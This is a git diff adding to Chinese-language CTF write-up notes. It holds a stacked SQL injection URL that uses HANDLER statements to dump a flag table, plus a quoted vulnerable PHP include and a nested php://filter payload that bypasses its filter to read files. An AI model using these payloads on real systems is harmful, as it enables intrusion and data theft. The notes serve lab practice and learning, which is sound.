@@ -585,6 +585,30 @@ id username password
 密码栏输入114514，输入的密码会与虚拟列进行比较，达到目的。
 但是注入后显示wrongpass
 看源码，其密码进行了md5加密，将md5加密后的密码放入语句，即虚拟行里，对比成功，拿到flag。
+[GYCTF2020]Blacklist
+堆叠注入看到表名，但是如果进行联合注入其返回了一个正则式，其屏蔽了大多数的语句，尝试大写注入，双写法注入，都失效。
+看wp，其提到了handler
+```
+1、`HANDLER tbl_name OPEN`
+
+打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
+
+2、`HANDLER tbl_name READ FIRST`
+
+获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
+
+3、`HANDLER tbl_name CLOSE`
+
+关闭打开的句柄。
+
+4、`HANDLER tbl_name READ index_name = value`
+
+通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
+```
+输入：
+`http://3c6e5317-cd37-4cee-9e1f-7ffdea4f0191.node3.buuoj.cn/?inject=1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
+`拿到flag
+[CISCN2019 华北赛区 Day2 Web1]Hack World
 [网鼎杯 2018]Fakebook #PHP反序列化漏洞  #ssrf利用
 进入环境，有login,join两个功能，在login尝试直接sqli全部返回loginfailed，直接进行sqli是不可行的。
 在join页面创建账号与blog也全部返回blog is not valid.
@@ -783,6 +807,26 @@ ls找不到就直接find，不能傻乎乎的../../../../../../../。。。。�
 [BSidesCF 2020]Had a bad day #Include文件包含漏洞 
 进入页面，可以选择woofers或者meowers,选择后会显示猫猫狗狗
 看到url有参数category，传别的字符串提示必须包含woofers或meowers。
-误打误撞哈，直接传：
+直接传：
 `category=php://filter/convert.base64-encode/resource=index`
-发现是可以看到源码的，b
+发现是可以看到源码的，base64解码
+其中的php部分：
+```php
+<?php
+    $file = $_GET['category'];
+    if(isset($file))
+    {
+        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+            include ($file . '.php');
+        }
+        else{
+            echo "Sorry, we currently only support woofers and meowers.";
+        }
+    }
+?>
+```
+其过滤条件包含了index所以可以看到源码。
+查看资料，伪协议是可以==嵌套使用==的。
+构造：
+`index.php?category=php://filter/convert.base64-encode/woofers/resource=flag`
+拿到flag。
